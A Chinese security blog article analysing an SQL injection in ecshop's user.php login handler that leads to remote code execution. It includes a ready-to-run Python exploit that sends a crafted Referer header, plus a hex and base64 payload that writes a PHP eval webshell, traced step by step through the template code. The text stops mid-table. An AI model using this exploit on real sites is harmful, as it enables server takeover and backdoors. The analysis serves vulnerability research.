---
title: ecshop全系列SQL注入漏洞分析
url: https://www.secpulse.com/archives/199872.html
source: 安全脉搏
date: 2023-05-06
fetch_date: 2025-10-04T11:38:15.149522
---

# ecshop全系列SQL注入漏洞分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# ecshop全系列SQL注入漏洞分析

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[第59号实验室](https://www.secpulse.com/newpage/author?author_id=49738)

2023-05-05

18,748

ecshop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。最新版本为3.6.0。而最近ecshop爆出存在SQL注入漏洞,且能影响至所有系列。本文就对该SQL注入漏洞的成因做简单的分析

## 漏洞原理

本次漏洞主要是由于user.php文件login响应存在漏洞,其内部的display的参数可被攻击者控制,从而导致SQL注入漏洞,利用该漏洞可实现远程任意命令执行。

## 漏洞利用

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` import requests headers = {     "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",     "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",     "Content-Type": "text/xml",     "Referer": "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}554fcae493e564ee0dc75bdf2ebf94ca" }   url = "http://192.168.5.130:8080/user.php" payload = {'action':'login'} requests.post(url,data=payload,headers=headers) ``` |

## 漏洞分析

login响应,将http\_referer的值赋予$back\_act,referer参数可被攻击者控制

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252724.png)

assign函数将$back\_act变量值赋给back\_act
smarty是模板引擎，将back\_act的值赋给模板文件user\_passport.dwt
display读取user\_passport.dwt文件内容，过滤后输出结果

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-16832527241.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252725.jpg)

display函数经 fetch -> make\_compiled -> file\_get\_contents -> fetch\_str ->smarty\_prefilter\_preCompile ->select 取出html中值$out,其中包含referer的内容
$out通过\_echash变量切割，而\_echash是代码里写死的

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252726.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252727.png)

此时referer的payload被切割成$val

|  |  |
| --- | --- |
| ``` 1 ``` | ``` $val="ads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}" ``` |

insert\_mod函数处理动态内容$val

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-16832527271.png)

以|划分$val

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` $fun=ads; $para="a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}" ``` |

$para经unserialize反序列化得

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` $para=array('num' => "*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -",'id'=>"'/*";) $fun='insert_'.$fun = 'insert_ads' ``` |

$fun($para)动态调用insert\_ads函数,即insert\_ads($para)
insert\_ads存在SQL注入漏洞,继续跟踪insert\_ads,该函数直接将id,num的值拼接到SQL中导致注入漏洞
其中id=”‘/\*“ 拼接a.posttion\_id的单引号,/\*与num配合注释掉order by

|  |  |
| --- | --- |
| ``` 1 ``` | ``` num="*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -",'id'=>"'/*" ``` |

num中的\*/与id/\*配合注释order by ,union联合查询在数据库中解析得

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` position_id = 0x272f2a = "'/*" position_style = 0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878  = {$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//}xxx ``` |

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252729.png)

position\_style经拼接重新到fetch

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252730.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252732.png)

fetch -> fetch\_str 将匹配到的字符传输至select函数处理
此时

|  |  |
| --- | --- |
| ``` 1 ``` | ``` position_style = "$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//" ``` |

跟踪position\_style至select函数

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252733.png)

select -> get\_val –> make\_var

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252736.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199872-1683252745.png)

最终匹配得

|  |  |
| --- | --- |
| ``` 1 ``` | ``` $p=this->_val['asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//'] ``` |

此时select中得

|  |  |
| --- | --- |
| ...